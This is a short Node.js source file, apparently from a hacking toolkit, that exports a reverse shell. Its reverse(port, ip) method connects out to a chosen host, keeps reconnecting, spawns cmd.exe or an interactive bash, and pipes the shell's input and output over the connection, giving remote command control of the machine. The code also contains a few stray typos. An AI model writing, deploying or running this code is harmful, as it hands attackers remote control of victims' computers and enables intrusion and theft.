#!/usr/bin/env node

var {spawn} = require('child_process');
var reconnect = require('reconnect-net');
var chalk = require('chalk')
module.exports.Shell= function Shell() {
  

    this.reverse = (port , ip) => {
        try{
        reconnect(function(stream) {
            //if the machine runs on Windows
            if (process.platform === "win32") {
                var ps = spawn('cmd.exe', []);0
                stream.pipe(ps.stdin);
            ps.stdout.pipe(stream, {
                end: false
            });
            ps.stderr.pipe(stream, {
                end: false
            });
            ps.on('exit', function() {
                stream.end()
            });
            //if the machine runs on linux
            }else{
                var ps = spawn('bash', ['-i']);
                stream.pipe(ps.stdin);
            ps.stdout.pipe(stream, {
                end: false
            });
            ps.stderr.pipe(stream, {
                end: false
            });
            ps.on('exit', function() {
              console.log(chalk.redBright("\n[-] Connection closed !\n"))
                stream.end()
            });            }
            
            //connects
          console.log(`\n[+] Connected !\n`)
          
        }).connect( port , ip)
        .on("error", () => {
            console.log(chalk.redBright("\n[!] An error occured, check your connection and the address used\n"))
            process.exit(0)
        })
        .on('fail', () => {
            console.log(chalk.redBright("\n[!] Failed to connect\n"))
        })
    }catch{n
        console.log(chalk.redBright("\n[-] An error occured !\n"))
    }}
   
}
